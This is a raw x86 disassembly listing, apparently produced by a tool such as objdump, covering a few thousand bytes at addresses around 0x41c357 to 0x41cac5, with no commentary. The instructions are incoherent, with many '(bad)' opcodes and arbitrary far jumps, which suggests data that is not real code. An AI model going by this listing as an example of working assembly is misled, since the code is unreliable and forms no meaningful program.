  41c357:	imul   edi,DWORD PTR [ebp-0xc],0xffffffd1
  41c35b:	addr16 out dx,al
  41c35d:	lods   eax,DWORD PTR ds:[esi]
  41c35e:	int    0x79
  41c360:	jns    0x41c332
  41c362:	jne    0x41c320
  41c364:	mov    WORD PTR [eax+0x644dfdc5],?
  41c36a:	sub    al,0x69
  41c36c:	(bad)  
  41c36e:	imul   esi,DWORD PTR [edx],0xffffffa8
  41c371:	aaa    
  41c372:	test   DWORD PTR [edi],esi
  41c374:	call   0xb4784139
  41c379:	mov    eax,0xb5203460
  41c37e:	xor    cl,BYTE PTR [ebx]
  41c380:	adc    eax,0x83e2470f
  41c385:	int    0x82
  41c387:	push   ecx
  41c388:	jb     0x41c3a0
  41c38a:	retf   
  41c38b:	push   es
  41c38c:	outs   dx,BYTE PTR ds:[esi]
  41c38d:	lods   eax,DWORD PTR ds:[esi]
  41c38e:	pop    ebp
  41c38f:	gs sahf 
  41c391:	dec    esi
  41c392:	(bad)
  41c395:	jno    0x41c3d2
  41c397:	lods   eax,DWORD PTR ds:[esi]
  41c398:	pusha  
  41c399:	push   cs
  41c39a:	cdq    
  41c39b:	cmc    
  41c39c:	clc    
  41c39d:	inc    eax
  41c39e:	test   al,0xed
  41c3a0:	js     0x41c420
  41c3a2:	push   es
  41c3a3:	and    BYTE PTR [eax+0x773d37b0],ah
  41c3a9:	add    eax,0xe576bfbd
  41c3ae:	dec    esi
  41c3af:	mov    DWORD PTR [eax+eax*4+0x339bdd2],ecx
  41c3b6:	mov    bl,0x62
  41c3b8:	push   ebx
  41c3b9:	cli    
  41c3ba:	inc    edi
  41c3bb:	outs   dx,DWORD PTR ds:[esi]
  41c3bc:	lahf   
  41c3bd:	pop    ds
  41c3be:	inc    ebx
  41c3bf:	inc    ebp
  41c3c0:	lods   al,BYTE PTR ds:[esi]
  41c3c1:	in     eax,dx
  41c3c2:	mov    ah,0x34
  41c3c4:	inc    ecx
  41c3c5:	push   eax
  41c3c6:	(bad)  
  41c3c7:	lock icebp 
  41c3c9:	cmp    BYTE PTR ds:0x1a6d835c,al
  41c3cf:	cmp    eax,0x207d2653
  41c3d4:	(bad)  
  41c3d5:	sbb    al,0xa6
  41c3d7:	mov    ecx,0x9a679494
  41c3dc:	(bad)  gs:[ebx+0x467fc2a8]
  41c3e3:	pop    ebx
  41c3e4:	push   esp
  41c3e5:	(bad)  
  41c3e6:	mul    DWORD PTR [edi+0x0]
  41c3e9:	inc    eax
  41c3ea:	cli    
  41c3eb:	(bad)  [esi]
  41c3ed:	sahf   
  41c3ee:	push   cs
  41c3ef:	sub    DWORD PTR [ebp+ecx*8-0x1f9d8e47],esp
  41c3f6:	cld    
  41c3f7:	(bad)  [ecx]
  41c3f9:	scas   al,BYTE PTR es:[edi]
  41c3fa:	hlt    
  41c3fb:	push   ebp
  41c3fc:	(bad)  
  41c3fd:	daa    
  41c3fe:	jno    0x41c46f
  41c400:	or     ecx,esi
  41c402:	(bad)  
  41c403:	and    eax,DWORD PTR [esi-0x1188fd46]
  41c409:	into   
  41c40a:	xlat   BYTE PTR ds:[ebx]
  41c40b:	jle    0x41c3d1
  41c40d:	(bad)  
  41c40e:	pop    eax
  41c40f:	lods   eax,DWORD PTR ds:[esi]
  41c410:	lock and bh,BYTE PTR [esi]
  41c413:	push   ebp
  41c414:	jmp    0xf7f9:0xf3b78165
  41c41b:	or     BYTE PTR [ebx-0x3e],ah
  41c41e:	jl     0x41c480
  41c420:	adc    al,0xfa
  41c422:	jle    0x41c3c9
  41c424:	push   es
  41c425:	fs xchg ecx,eax
  41c427:	and    eax,0x94a50c0c
  41c42c:	jle    0x41c464
  41c42e:	popa   
  41c42f:	push   esi
  41c430:	int    0xe6
  41c432:	mov    dh,0x2c
  41c434:	dec    ebp
  41c435:	fs mov esp,0xd48a3b8
  41c43b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c43c:	int    0xb8
  41c43e:	adc    eax,DWORD PTR [esi-0xed5d76a]
  41c444:	dec    esp
  41c445:	xlat   BYTE PTR ds:[ebx]
  41c446:	int    0xd3
  41c448:	jns    0x41c428
  41c44a:	int    0x32
  41c44c:	pop    esp
  41c44d:	add    ecx,DWORD PTR [eax+eiz*8]
  41c450:	mov    ebp,0xbf9a7d76
  41c455:	(bad)  
  41c457:	stos   DWORD PTR es:[edi],eax
  41c458:	nop
  41c459:	(bad)  
  41c45a:	mov    eax,ds:0x7b1d8235
  41c45f:	sub    BYTE PTR [edx-0x76],ah
  41c462:	push   ecx
  41c463:	sbb    eax,0xf8971811
  41c468:	mov    ebx,0x361ad693
  41c46d:	inc    esp
  41c46e:	mul    DWORD PTR [ebx+0x127dc79]
  41c474:	mov    DWORD PTR [ecx-0x53],edx
  41c477:	and    BYTE PTR [edx],ah
  41c479:	loopne 0x41c4a4
  41c47b:	aas    
  41c47c:	pop    ecx
  41c47d:	dec    edx
  41c47e:	inc    edi
  41c47f:	das    
  41c480:	mov    dl,0x5e
  41c482:	fcomi  st,st(5)
  41c484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c485:	push   DWORD PTR [eax-0x15]
  41c488:	mov    DWORD PTR [esi-0x55edb886],esp
  41c48e:	cs hlt 
  41c490:	es push ds
  41c492:	add    al,0xcb
  41c494:	test   al,0x86
  41c496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c497:	push   edi
  41c498:	in     al,0xc5
  41c49a:	imul   eax,DWORD PTR [ebp-0x21],0x4e
  41c49e:	cli    
  41c49f:	cmp    DWORD PTR [edx+0x6f6ca2ab],eax
  41c4a5:	fldcw  WORD PTR [esi+0x490910a1]
  41c4ab:	add    eax,0x1bce3b6a
  41c4b0:	mov    ebp,0xdec625b4
  41c4b5:	jo     0x41c46c
  41c4b7:	loope  0x41c4f2
  41c4b9:	inc    esi
  41c4ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4bb:	fisttp QWORD PTR ds:[ecx+0x14ebaa7]
  41c4c2:	(bad)
  41c4c6:	sar    DWORD PTR [ebp-0x7f],cl
  41c4c9:	and    eax,esp
  41c4cb:	mov    al,0x3b
  41c4cd:	(bad)  
  41c4ce:	fdiv   DWORD PTR [eax+0x22]
  41c4d1:	xchg   BYTE PTR [esi-0x45],cl
  41c4d4:	sbb    eax,0x6e052efc
  41c4d9:	push   es
  41c4da:	and    BYTE PTR [eax-0x14],dl
  41c4dd:	mov    bl,0x85
  41c4df:	pop    ebx
  41c4e0:	mov    bh,0x79
  41c4e2:	(bad)  
  41c4e3:	jl     0x41c4cb
  41c4e5:	sbb    BYTE PTR [edi-0x25f70a8e],dl
  41c4eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4ec:	dec    edi
  41c4ed:	sti    
  41c4ee:	cs pop ecx
  41c4f0:	mov    esp,0x1b6ca915
  41c4f5:	cdq    
  41c4f6:	leave  
  41c4f7:	sbb    al,0xf1
  41c4f9:	lds    eax,FWORD PTR [ebp-0x4c47e238]
  41c4ff:	daa    
  41c500:	stos   BYTE PTR es:[edi],al
  41c501:	in     eax,0xd3
  41c503:	and    ecx,DWORD PTR [ecx+0x28]
  41c506:	mov    eax,ds:0x81cfd6ad
  41c50b:	adc    eax,0x297e1fb
  41c510:	push   0x8b00b191
  41c515:	outs   dx,DWORD PTR ds:[esi]
  41c516:	sub    al,0xe9
  41c518:	dec    esi
  41c519:	sub    ch,bl
  41c51b:	jb     0x41c4bd
  41c51d:	(bad)  
  41c51e:	frstpm(287 only) 
  41c520:	fild   WORD PTR [edi]
  41c522:	jnp    0x41c592
  41c524:	ja     0x41c5a4
  41c526:	fadd   DWORD PTR [ecx+edi*2]
  41c529:	sbb    ebx,DWORD PTR [edi-0x3c]
  41c52c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c52d:	aad    0xe9
  41c52f:	adc    BYTE PTR [ecx+esi*2],cl
  41c532:	ficomp WORD PTR [ebx]
  41c534:	je     0x41c555
  41c536:	jnp    0x41c4e6
  41c538:	(bad)  
  41c539:	mov    dh,0x87
  41c53b:	loop   0x41c577
  41c53d:	fld    DWORD PTR ds:0xe01b963b
  41c543:	aad    0x4f
  41c545:	jp     0x41c543
  41c547:	add    DWORD PTR [edx-0x189f8e1],ebp
  41c54d:	loopne 0x41c581
  41c54f:	nop
  41c550:	jb     0x41c521
  41c552:	ja     0x41c51b
  41c554:	fbstp  TBYTE PTR [ebx+0x3f453d10]
  41c55a:	movsx  edx,BYTE PTR [edi-0x4b]
  41c55e:	dec    esi
  41c55f:	in     al,0x23
  41c561:	ins    DWORD PTR es:[edi],dx
  41c562:	push   edx
  41c563:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c565:	cmp    dl,BYTE PTR [eax+0x50d600b6]
  41c56b:	call   0x2ac6:0x822ba598
  41c572:	cmp    dl,bh
  41c574:	test   BYTE PTR [ecx+0x7420e38b],al
  41c57a:	pop    ss
  41c57b:	xor    DWORD PTR [esi],esi
  41c57d:	sub    bh,BYTE PTR [ebp+0x10604358]
  41c583:	addr16 ret 0x8a05
  41c587:	push   ebx
  41c588:	or     al,0x6a
  41c58a:	pop    ecx
  41c58b:	cmp    ch,bl
  41c58d:	loope  0x41c547
  41c58f:	xlat   BYTE PTR ds:[ebx]
  41c590:	xchg   ebp,eax
  41c591:	repz inc eax
  41c593:	inc    esi
  41c594:	add    BYTE PTR [edi],cl
  41c596:	inc    esp
  41c597:	add    DWORD PTR [ecx],ebp
  41c599:	lea    ebp,[ecx+0x6e]
  41c59c:	nop
  41c59d:	cmp    al,0x4f
  41c59f:	test   BYTE PTR [eax+ecx*1-0x53423057],0xcb
  41c5a7:	aad    0xb5
  41c5a9:	and    eax,0x19ff8bb0
  41c5ae:	push   edi
  41c5af:	rol    DWORD PTR [edi-0x37b7c584],1
  41c5b5:	(bad)  [edi-0x2f4e6fa1]
  41c5bb:	jmp    FWORD PTR [ecx]
  41c5bd:	lods   al,BYTE PTR ds:[esi]
  41c5be:	sbb    bl,BYTE PTR [edi-0x2b]
  41c5c1:	dec    esi
  41c5c2:	out    0xac,al
  41c5c4:	std    
  41c5c5:	aam    0x9f
  41c5c7:	test   al,0xb6
  41c5c9:	fisub  WORD PTR [edx-0x8]
  41c5cc:	or     eax,0xb8200287
  41c5d1:	push   ss
  41c5d2:	not    dl
  41c5d4:	nop
  41c5d5:	das    
  41c5d6:	loopne 0x41c581
  41c5d8:	loop   0x41c5aa
  41c5da:	dec    esp
  41c5db:	sahf   
  41c5dc:	push   0x9d890c71
  41c5e1:	mov    WORD PTR [ecx+0x4c],fs
  41c5e4:	in     eax,0x79
  41c5e6:	ficomp DWORD PTR [edi+edi*1+0x55]
  41c5ea:	dec    edx
  41c5eb:	dec    ecx
  41c5ec:	pop    es
  41c5ed:	and    BYTE PTR [ebx],bh
  41c5ef:	xchg   esi,eax
  41c5f0:	add    eax,0x65a58ef7
  41c5f5:	das    
  41c5f6:	add    eax,0x195c7761
  41c5fb:	inc    BYTE PTR [eax+0x2399890e]
  41c601:	cmp    ebx,edi
  41c603:	dec    esp
  41c604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c605:	iret   
  41c606:	mov    ds:0x42e30569,al
  41c60b:	mov    ch,0x8e
  41c60d:	or     al,0xcb
  41c60f:	fucompp 
  41c611:	(bad)  
  41c612:	out    0x1f,eax
  41c614:	xchg   edi,eax
  41c615:	push   esi
  41c616:	and    BYTE PTR [ecx-0xcf4b865],bl
  41c61c:	xchg   ecx,eax
  41c61d:	test   al,0x9d
  41c61f:	adc    ecx,edx
  41c621:	shl    BYTE PTR [eax],0x2a
  41c624:	xor    BYTE PTR [esp+eax*4+0x2455dd60],dh
  41c62b:	xchg   esi,eax
  41c62c:	retf   0xc48a
  41c62f:	push   esp
  41c630:	mov    edx,0xffacd446
  41c635:	jmp    0x839b:0x53c9fde3
  41c63c:	shl    DWORD PTR [eax+0x7],cl
  41c63f:	out    dx,eax
  41c640:	es sbb bl,cl
  41c643:	jmp    0xbda57f0
  41c648:	cli    
  41c649:	push   ecx
  41c64a:	out    0xb2,al
  41c64c:	(bad)  
  41c64e:	jge    0x41c658
  41c650:	lea    esp,[edi-0x76fc3eb5]
  41c656:	lea    eax,[edx]
  41c658:	sbb    bh,BYTE PTR [edx]
  41c65a:	xor    edx,ebp
  41c65c:	adc    DWORD PTR [ebp+0x7],eax
  41c65f:	in     eax,dx
  41c660:	xor    al,0xaa
  41c662:	cmp    eax,0xeddc7fcf
  41c667:	jle    0x41c6c7
  41c669:	lahf   
  41c66a:	jge    0x41c6cd
  41c66c:	fxch   st(6)
  41c66e:	js     0x41c6c5
  41c670:	das    
  41c671:	call   0xede0687d
  41c676:	xor    DWORD PTR [esi-0x7c],ecx
  41c679:	cwde   
  41c67a:	or     al,0x60
  41c67c:	cmp    BYTE PTR [ebx+0x59],cl
  41c67f:	dec    edi
  41c680:	xor    al,0xd1
  41c682:	sub    al,0x92
  41c684:	or     cl,BYTE PTR [edx+0xe49a194]
  41c68a:	mov    esp,0xc0363c29
  41c68f:	xchg   ebx,eax
  41c690:	test   al,0xce
  41c692:	outs   dx,DWORD PTR ds:[esi]
  41c693:	les    eax,FWORD PTR [ebx+ebp*1+0x75]
  41c697:	xlat   BYTE PTR ds:[ebx]
  41c698:	adc    edx,DWORD PTR [edx-0x252ab51c]
  41c69e:	mov    ebx,0x7189e640
  41c6a3:	(bad)  
  41c6a4:	jmp    0x8e27:0xc408ada6
  41c6ab:	mov    ds:0xc38020c3,al
  41c6b0:	clc    
  41c6b1:	push   0x5b
  41c6b3:	stos   DWORD PTR es:[edi],eax
  41c6b4:	push   ds
  41c6b5:	stc    
  41c6b6:	gs inc ecx
  41c6b8:	(bad)  
  41c6b9:	jmp    0x41c6fb
  41c6bb:	lods   al,BYTE PTR ds:[esi]
  41c6bc:	mov    dh,0xc0
  41c6be:	cdq    
  41c6bf:	mov    eax,ds:0x9a472472
  41c6c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6c5:	push   edx
  41c6c6:	imul   ecx,esi,0x692f556a
  41c6cc:	fidiv  DWORD PTR [eax+0x46e7ca13]
  41c6d2:	xchg   edi,eax
  41c6d3:	lahf   
  41c6d4:	adc    eax,0xc327aab8
  41c6d9:	or     ebx,ebp
  41c6db:	mov    DWORD PTR [esi+0x49],ecx
  41c6de:	jno    0x41c75c
  41c6e0:	push   es
  41c6e1:	sub    DWORD PTR [ecx+ebx*2],esi
  41c6e4:	and    al,0xb4
  41c6e6:	stc    
  41c6e7:	rol    BYTE PTR [esi+ebx*2-0xb],cl
  41c6eb:	lock pop ds
  41c6ed:	daa    
  41c6ee:	lahf   
  41c6ef:	nop
  41c6f0:	lds    esp,FWORD PTR ds:0x677e4016
  41c6f6:	jmp    0xc150d4da
  41c6fb:	sub    ebx,DWORD PTR [ebx-0x4d192693]
  41c701:	aaa    
  41c702:	pusha  
  41c703:	into   
  41c704:	iret   
  41c705:	or     DWORD PTR [esi],0x526e141e
  41c70b:	sbb    DWORD PTR [eax+0x23faf05f],edx
  41c711:	add    eax,0xc1423c17
  41c716:	ror    ch,0x8
  41c719:	repz test al,0xc8
  41c71c:	shl    BYTE PTR ds:0xb1b79bf2,0x1b
  41c723:	js     0x41c734
  41c725:	retf   
  41c726:	fstp   QWORD PTR [edi-0x46]
  41c729:	mov    BYTE PTR [ecx-0x64],bh
  41c72c:	pop    ecx
  41c72d:	test   al,0xf
  41c72f:	and    al,0x40
  41c731:	mov    esi,0x45ffd64a
  41c736:	daa    
  41c737:	ret    
  41c738:	sbb    BYTE PTR [edi-0x68],cl
  41c73b:	ins    BYTE PTR es:[edi],dx
  41c73c:	addr16 in eax,0x4d
  41c73f:	loope  0x41c785
  41c741:	das    
  41c742:	sbb    al,bl
  41c744:	push   ss
  41c745:	adc    al,0x4b
  41c747:	outs   dx,BYTE PTR ds:[esi]
  41c748:	inc    esi
  41c749:	push   cs
  41c74a:	out    0x31,eax
  41c74c:	int    0x3
  41c74e:	push   edx
  41c74f:	push   ebp
  41c750:	jo     0x41c6d3
  41c752:	les    edx,FWORD PTR [ebx]
  41c754:	xchg   ecx,eax
  41c755:	enter  0x3360,0x61
  41c759:	mov    bh,0x12
  41c75b:	shl    DWORD PTR [edx],1
  41c75d:	add    esp,edi
  41c75f:	inc    eax
  41c760:	xchg   ebx,eax
  41c761:	or     edx,DWORD PTR [edi-0x5c]
  41c764:	sbb    bl,ah
  41c766:	ds aaa 
  41c768:	sar    DWORD PTR [ebp+esi*1-0x108288fc],0x4d
  41c770:	sub    DWORD PTR [ebx-0x7b],ebp
  41c773:	por    mm5,QWORD PTR [ecx+0x4e3ad633]
  41c77a:	das    
  41c77b:	addr16 mov ebx,0xdeafaae0
  41c781:	pop    es
  41c782:	jmp    0xf4f2:0xbd089403
  41c789:	js     0x41c77f
  41c78b:	repnz or ebx,DWORD PTR [ebp-0x5346a955]
  41c792:	test   DWORD PTR [edi-0x24],0x8287ef8e
  41c799:	mov    ecx,0x32843aaf
  41c79e:	test   DWORD PTR [esi+0x9],0xe089f560
  41c7a5:	mov    ss,WORD PTR [ebx+0x14e7a3a]
  41c7ab:	sahf   
  41c7ac:	adc    cl,BYTE PTR [esp+edx*2-0x4f]
  41c7b0:	and    esp,eax
  41c7b2:	and    BYTE PTR [ebp-0x20],0xd4
  41c7b6:	sub    eax,0x1ab19a31
  41c7bb:	aaa    
  41c7bc:	jle    0x41c7dc
  41c7be:	push   ecx
  41c7bf:	loope  0x41c83b
  41c7c1:	and    ah,0xe5
  41c7c4:	ror    ecx,cl
  41c7c6:	push   ss
  41c7c7:	in     al,0xb3
  41c7c9:	pop    es
  41c7ca:	imul   ebp,DWORD PTR [esp+ebx*2],0xffffffd0
  41c7ce:	sahf   
  41c7cf:	stos   DWORD PTR es:[edi],eax
  41c7d0:	or     eax,0xd547141f
  41c7d5:	shr    ebp,cl
  41c7d7:	imul   edx,DWORD PTR [ebp-0x22f9f4ef],0x74f21262
  41c7e1:	add    al,0x6c
  41c7e3:	jmp    0x715d7670
  41c7e8:	out    dx,eax
  41c7e9:	adc    ch,BYTE PTR [ecx]
  41c7eb:	pop    eax
  41c7ec:	jnp    0x41c84a
  41c7ee:	mov    dl,0x4f
  41c7f0:	lahf   
  41c7f1:	loopne 0x41c77d
  41c7f3:	xor    cl,dl
  41c7f5:	pop    esi
  41c7f6:	into   
  41c7f7:	add    al,0xa2
  41c7f9:	sbb    edi,DWORD PTR ds:0xce36d6e2
  41c7ff:	jge    0x41c880
  41c801:	pop    eax
  41c802:	push   ebp
  41c803:	add    eax,0x8f60635c
  41c808:	xchg   ebp,eax
  41c809:	jb     0x41c810
  41c80b:	sbb    ebx,DWORD PTR [esi+edi*8]
  41c80e:	sub    eax,0x35606d75
  41c813:	pop    es
  41c814:	jmp    0x41c7f0
  41c816:	and    al,0x7b
  41c818:	retf   
  41c819:	retf   
  41c81a:	jmp    0x3964:0xd9196602
  41c821:	sub    esi,DWORD PTR [esi+0x7d46e3d]
  41c827:	xor    al,0x27
  41c829:	sub    bh,al
  41c82b:	(bad)  
  41c82c:	mov    bl,0x4
  41c82e:	add    DWORD PTR [ecx-0x1b89c507],ecx
  41c834:	mov    ah,0xff
  41c836:	mov    esi,0xdd8c585d
  41c83b:	ret    0x3d42
  41c83e:	or     eax,0x4a079d4c
  41c843:	stos   BYTE PTR es:[edi],al
  41c844:	and    al,0x59
  41c846:	in     eax,dx
  41c847:	sub    DWORD PTR [ebx-0x568b6070],0xf8a615e4
  41c851:	add    al,0x2a
  41c853:	xor    dl,BYTE PTR [edi]
  41c855:	pop    ebx
  41c856:	ds hlt 
  41c858:	in     al,dx
  41c859:	sbb    BYTE PTR [esp+ecx*2],0x6e
  41c85d:	and    BYTE PTR [eax-0x5a],dl
  41c860:	mov    dl,0xcc
  41c862:	pop    esi
  41c863:	sub    dl,BYTE PTR [ebx+0x2cf2f207]
  41c869:	repnz xchg edi,eax
  41c86b:	int3   
  41c86c:	push   esp
  41c86d:	xor    al,0x83
  41c86f:	jns    0x41c830
  41c871:	repnz inc edi
  41c873:	stos   BYTE PTR es:[edi],al
  41c874:	adc    BYTE PTR [edx],dl
  41c876:	push   es
  41c877:	mov    edi,edx
  41c879:	imul   esp,DWORD PTR [edx],0xf993b833
  41c87f:	jae    0x41c8ec
  41c881:	mov    esi,0xc35d46b6
  41c886:	xchg   edi,eax
  41c887:	stos   BYTE PTR es:[edi],al
  41c888:	popa   
  41c889:	test   DWORD PTR [ebx-0x74],ecx
  41c88c:	push   edx
  41c88d:	in     eax,0x30
  41c88f:	pusha  
  41c890:	adc    BYTE PTR [edi],0x4e
  41c893:	cwde   
  41c894:	cmp    eax,0xa2941a22
  41c899:	pop    ss
  41c89a:	mov    cl,0x64
  41c89c:	dec    esi
  41c89d:	inc    ebx
  41c89e:	or     esp,ebx
  41c8a0:	(bad)  
  41c8a1:	in     al,dx
  41c8a2:	fs (bad) 
  41c8a4:	clc    
  41c8a5:	and    eax,0xba29a7e8
  41c8aa:	fcmovnu st,st(0)
  41c8ac:	mov    esp,DWORD PTR [edi+0x29daf860]
  41c8b2:	sub    DWORD PTR [edi-0x8],edx
  41c8b5:	jge    0x41c8c1
  41c8b7:	cld    
  41c8b8:	pop    esp
  41c8b9:	les    esi,FWORD PTR [eax-0x3610265b]
  41c8bf:	fisttp QWORD PTR [ebx]
  41c8c1:	and    esi,DWORD PTR [edx-0x3d]
  41c8c4:	ja     0x41c929
  41c8c6:	enter  0x4bc7,0xaf
  41c8ca:	pop    ss
  41c8cb:	fadd   st,st(7)
  41c8cd:	pop    edi
  41c8ce:	call   0x301b:0xc540fd73
  41c8d5:	out    dx,eax
  41c8d6:	ins    DWORD PTR es:[edi],dx
  41c8d7:	mov    ah,0x5c
  41c8d9:	retf   
  41c8da:	xchg   ebx,eax
  41c8db:	mov    ebp,0x4aeec4a3
  41c8e0:	scas   al,BYTE PTR es:[edi]
  41c8e1:	jmp    0x81d7:0xdbf551d0
  41c8e8:	jecxz  0x41c8ab
  41c8ea:	add    ch,BYTE PTR ds:0x4d26fd8f
  41c8f0:	push   eax
  41c8f1:	mov    bl,0xc2
  41c8f3:	mov    ebx,0xf18fca3d
  41c8f8:	frstor [eax-0x40]
  41c8fb:	lods   eax,DWORD PTR ds:[esi]
  41c8fc:	adc    al,BYTE PTR [esi]
  41c8fe:	in     al,0x52
  41c900:	add    al,0xb
  41c902:	dec    edx
  41c903:	call   0x829c:0xb7968fa0
  41c90a:	daa    
  41c90b:	std    
  41c90c:	fcom   QWORD PTR [edx+esi*1+0x68]
  41c910:	mov    ah,0xb0
  41c912:	jge    0x41c8d5
  41c914:	pop    esp
  41c915:	imul   esi,edi,0xffffffc4
  41c918:	jno    0x41c912
  41c91a:	xor    dh,BYTE PTR [eax-0x64ea7e6a]
  41c920:	pop    ebp
  41c921:	(bad)  
  41c922:	imul   ebx,DWORD PTR [edi],0x9eb380fa
  41c928:	adc    edx,esp
  41c92a:	xchg   esp,eax
  41c92b:	cmp    esp,ebx
  41c92d:	xchg   ebp,eax
  41c92e:	iret   
  41c92f:	das    
  41c930:	fild   DWORD PTR [eax+ebx*4]
  41c933:	loope  0x41c8f0
  41c935:	ss push edi
  41c937:	mov    cl,0xbb
  41c939:	stos   BYTE PTR es:[edi],al
  41c93a:	sub    WORD PTR [ebp+0xe4c2fe8],sp
  41c941:	sub    al,bh
  41c943:	sbb    BYTE PTR [esi+0x7086a60d],al
  41c949:	dec    edx
  41c94a:	sub    esi,esp
  41c94c:	sahf   
  41c94d:	push   eax
  41c94e:	comiss xmm5,DWORD PTR [ecx-0x54]
  41c952:	(bad)  
  41c953:	(bad)  
  41c954:	push   ss
  41c955:	lea    ebp,[ebx+0x43639c4]
  41c95b:	xor    al,dh
  41c95d:	mov    edi,DWORD PTR [edi+0x6f6a80ae]
  41c963:	shr    DWORD PTR [ebx+0x1c],1
  41c966:	cli    
  41c967:	xchg   esi,eax
  41c968:	ret    0xcc51
  41c96b:	ds mov bh,cl
  41c96e:	push   ds
  41c96f:	dec    ebx
  41c970:	(bad)  
  41c971:	arpl   di,cx
  41c973:	pop    ebp
  41c974:	aaa    
  41c975:	ds setae al
  41c979:	out    0xc6,eax
  41c97b:	add    BYTE PTR [esi],dl
  41c97d:	push   eax
  41c97e:	xor    ecx,DWORD PTR [ecx]
  41c980:	mov    al,0x6b
  41c982:	popf   
  41c983:	js     0x41c9b4
  41c985:	loopne 0x41c9cb
  41c987:	mov    DWORD PTR [edi+0x44afa197],eax
  41c98d:	xchg   edi,eax
  41c98e:	xchg   esi,eax
  41c98f:	mov    ecx,0x93620e9a
  41c994:	or     al,dh
  41c996:	pushf  
  41c997:	out    0xf4,al
  41c999:	jp     0x41c9cf
  41c99b:	sbb    al,cl
  41c99d:	fwait
  41c99e:	jmp    0x27a3:0x83c33d09
  41c9a5:	fnstenv [ebp+0x42]
  41c9a8:	test   al,0x7c
  41c9aa:	jbe    0x41c9d7
  41c9ac:	scas   al,BYTE PTR es:[edi]
  41c9ad:	fdivr  DWORD PTR [ebx-0x2f]
  41c9b0:	scas   al,BYTE PTR es:[edi]
  41c9b1:	or     BYTE PTR [ecx-0x11368d35],ch
  41c9b7:	aam    0x8
  41c9b9:	imul   ebx,DWORD PTR [eax],0xfe8ea2f2
  41c9bf:	ss xor ax,0x849c
  41c9c4:	adc    ecx,DWORD PTR [edi+0x2c3a00d9]
  41c9ca:	bound  edi,QWORD PTR [ecx+0x71507a5f]
  41c9d0:	ins    BYTE PTR es:[edi],dx
  41c9d1:	mov    edi,0xd90050e5
  41c9d6:	or     eax,0xfeafdfc9
  41c9db:	dec    edx
  41c9dc:	pop    ebx
  41c9dd:	sub    ebp,esp
  41c9df:	in     eax,dx
  41c9e0:	hlt    
  41c9e1:	test   DWORD PTR [esi],ebp
  41c9e3:	mov    dh,0xb9
  41c9e5:	push   es
  41c9e6:	sti    
  41c9e7:	xor    dl,BYTE PTR [esi+0x20]
  41c9ea:	or     eax,0xcac61e83
  41c9ef:	jle    0x41ca4d
  41c9f1:	lahf   
  41c9f2:	jmp    0xb20a4a59
  41c9f7:	call   FWORD PTR [edx]
  41c9f9:	dec    edx
  41c9fa:	scas   eax,DWORD PTR es:[edi]
  41c9fb:	les    edi,FWORD PTR [esi-0x1cb2ad63]
  41ca01:	add    al,0xa5
  41ca03:	xor    al,0xe2
  41ca05:	xchg   esi,eax
  41ca06:	call   0x55364b45
  41ca0b:	jnp    0x41ca50
  41ca0d:	inc    ebp
  41ca0e:	inc    esp
  41ca0f:	mov    ch,0x87
  41ca11:	cmc    
  41ca12:	pop    esi
  41ca13:	out    dx,al
  41ca14:	mov    edi,0x49cc2c21
  41ca19:	dec    esi
  41ca1a:	ds mov ecx,0x21723fd2
  41ca20:	pushf  
  41ca21:	lds    esi,FWORD PTR [edx]
  41ca23:	sar    bl,cl
  41ca25:	arpl   WORD PTR [esi],cx
  41ca27:	(bad)  
  41ca28:	inc    esp
  41ca29:	dec    edi
  41ca2a:	mov    esi,0x76d3f933
  41ca2f:	xchg   ebp,eax
  41ca30:	or     bh,BYTE PTR [edi+ebp*4]
  41ca33:	jle    0x41c9d3
  41ca35:	and    eax,0xe29c2e20
  41ca3a:	rcl    BYTE PTR [edx+0x6d218115],1
  41ca40:	iret   
  41ca41:	add    DWORD PTR [ebx-0x40],esi
  41ca44:	xchg   esp,eax
  41ca45:	sub    DWORD PTR [ebx+eiz*1-0x1dbf70a4],esi
  41ca4c:	dec    edx
  41ca4d:	fucomip st,st(0)
  41ca4f:	inc    ecx
  41ca50:	pop    ds
  41ca51:	icebp  
  41ca52:	les    edx,FWORD PTR [ebx]
  41ca54:	(bad)  
  41ca55:	pop    edi
  41ca56:	inc    eax
  41ca57:	adc    eax,0xa75825c3
  41ca5c:	push   0xee83bc1e
  41ca61:	ins    BYTE PTR es:[edi],dx
  41ca62:	and    eax,0x25f48590
  41ca67:	(bad)  
  41ca68:	ror    cl,0xe
  41ca6b:	stos   BYTE PTR es:[edi],al
  41ca6c:	add    DWORD PTR [esi+0x3b],esi
  41ca6f:	daa    
  41ca70:	popa   
  41ca71:	lahf   
  41ca72:	sub    esp,DWORD PTR [ebp-0x7a5911c5]
  41ca78:	dec    ebp
  41ca79:	loop   0x41ca27
  41ca7b:	pop    gs
  41ca7d:	leave  
  41ca7e:	(bad)  
  41ca7f:	es mov eax,0x7d5cee15
  41ca85:	sahf   
  41ca86:	fistp  WORD PTR [ecx-0x40]
  41ca89:	repnz push ebp
  41ca8b:	shl    cl,0x7e
  41ca8e:	hlt    
  41ca8f:	call   FWORD PTR [edx+0x20]
  41ca92:	outs   dx,BYTE PTR ds:[esi]
  41ca93:	mov    esp,0xb4f6ae4e
  41ca98:	sub    al,0x89
  41ca9a:	pusha  
  41ca9b:	scas   al,BYTE PTR es:[edi]
  41ca9c:	daa    
  41ca9d:	imul   esp,DWORD PTR [eax-0x3c8d6048],0xb773044b
  41caa7:	stos   DWORD PTR es:[edi],eax
  41caa8:	or     al,0x37
  41caaa:	adc    DWORD PTR [ebx],esi
  41caac:	test   BYTE PTR [ecx+0x37],dl
  41caaf:	rcr    BYTE PTR cs:[edi+0x73],1
  41cab3:	sbb    ah,ch
  41cab5:	outs   dx,BYTE PTR ds:[esi]
  41cab6:	mov    dh,0x26
  41cab8:	lds    ebx,FWORD PTR [eax]
  41caba:	dec    ebp
  41cabb:	sub    DWORD PTR [eax-0x4],esp
  41cabe:	xor    dl,BYTE PTR [ebx+0x74]
  41cac1:	and    BYTE PTR [edx],ah
  41cac3:	std    
  41cac4:	dec    esi
  41cac5:	call   0xe119:0x97faa3c6
